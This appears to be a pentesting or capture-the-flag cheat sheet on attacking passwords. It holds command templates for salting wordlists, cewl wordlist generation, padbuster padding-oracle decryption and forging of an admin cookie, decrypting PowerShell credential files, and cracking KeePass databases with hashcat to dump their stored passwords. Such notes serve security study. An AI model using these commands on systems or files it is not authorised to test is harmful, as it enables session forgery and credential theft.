# Passwords and hashes
Ways to break password hashes, or just methods to make the brute-force easier.

# Adding salt (as a normal string) to a password file
This is if the password has no salt shown, because it has been concatenated when encrypting, therefore the salt has to be added to the dictionary, line-by-line.
```bash
sed -e 's/^/prefix/' <file> > <file.new>
```


# Cewl
Cewl can be used on a webpage, and if one suspects that a password is hidden     
somewhere in the website.

## Usage
```bash
cewl -w <wordlist> -d 10 -m 1 <url>
```


# Padding oracle attack
## Usage
```bash
# DECRYPT
padbuster <url> "cookie" 8 -encoding 0 -cookies "cookiename=cookie"

# ENCRYPT NEW COOKIE
padbuster <url> "old_cookie" 8 -encoding 0 -cookies "auth=old_cookie" -plaintext "user=admin"
```

### Reference
- [https://book.hacktricks.xyz/crypto-and-stego/padding-oracle-priv](https://book.hacktricks.xyz/crypto-and-stego/padding-oracle-priv)


# Powershell credentials file
The command below can be used to, decrypt a given credentials file. **(has to be logged in as the user)**
```powershell
(Import-CliXml -Path user.txt).GetNetworkCredential().Password
```


# KeePass (jenkins) & kdbx files
## Usage
1.  Use `keepass2john` to make the file into a hash.
2. Crack the hash file (from step 1) with hashcat, this will give you the **master password**    
```bash
hashcat.bin CEH.kdbx.hash /usr/share/wordlists/rockyou.txt --user
```
3. Use `kpcli` to extract passwords: 
```bash
kpcli --kdb <file>.kdbx
```
4. Run, `find .` in `kpcl`i will list all of the passwords
5. `show -f [num]` will print a password based on the number that was input 